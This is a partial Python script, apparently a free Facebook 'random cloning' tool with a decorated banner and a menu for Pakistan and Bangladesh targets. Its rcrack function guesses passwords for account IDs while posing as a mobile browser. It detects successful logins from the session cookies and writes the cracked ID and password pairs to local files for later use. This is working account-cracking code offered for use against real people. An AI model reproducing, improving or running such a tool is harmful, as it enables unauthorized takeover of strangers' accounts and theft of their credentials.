...
\033[1;33m----------------------------------------------
 \033[1;37mAUTHOR    : \033[1;36mSOMIA-SULTAN
 \033[1;35mGITHUB    : \033[1;35m*******
 \033[1;39mFACEBOOK  : \033[1;33m SOMI
 \033[1;36mTOOL NAME : \033[1;34mRANDOM
 \033[1;35mTOOL TYPE : \033[1;37mFREE
 \033[1;32mVERSION   : \033[1;39m0.9
\033[1;33m----------------------------------------------
\033[1;34mham b baadshao k🔥 baad hn  !👑
\033[1;31mmera putarr❤bato se zaat   🤷
\033[1;35mor harkto se okaat. 🤨
\033[1;38mpichan laty hn. 🤙😈
\033[1;33m----------------------------------------------""")
...
def riaz():
	os.system('clear')
	print(logo)
	print('[1] Random Cloning(Pakistan)')
	print('[2] Random Cloning(Bangladesh)')
	...
	if king1 =='3':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100088472738732');riaz()
	if king1 =='2':
		bangla()
	else:
...
def king():
    ...
    print('\x1b[1;97m[3] RANDOM NEW IDZ UPDATE  \x1b[1;92m3')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5,'
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[SOMI-OK] '+cid+'|'+ps+'\033[0;97m')
                open('SOMI-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[SOMI-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('SOMI-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;99mSOMI\033[1;99m] %s|\33[1;99mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
